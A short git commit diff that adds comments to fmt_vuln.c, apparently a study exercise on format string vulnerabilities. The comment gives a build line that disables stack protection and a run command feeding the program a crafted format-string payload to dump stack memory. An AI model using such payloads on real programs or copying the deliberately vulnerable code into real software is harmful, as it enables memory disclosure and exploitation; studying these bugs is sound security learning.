4dc0c2c3c257ebfcd2074af8dde404cd212a0c7c
stgleb <glebstepanov1992@gmail.com>
2019-08-07 20:08:13 +0300

    add comments

--- chapter0x3/fmt_vuln.c
+++ chapter0x3/fmt_vuln.c
@@ -1,6 +1,14 @@
+/*
+build:
+	gcc -g fmt_vuln.c -fno-stack-protector -o fmt_vuln
+run:
+	./fmt_vuln "$(python -c 'import sys; sys.stdout.write("\x10\x50\x75\x55" + "%08x."*8)')"
+*/
+
 #include<stdio.h>
 #include<stdlib.h>
 #include<string.h>
+
 
 int main(int argc,char* argv[]){
     char text[1024];
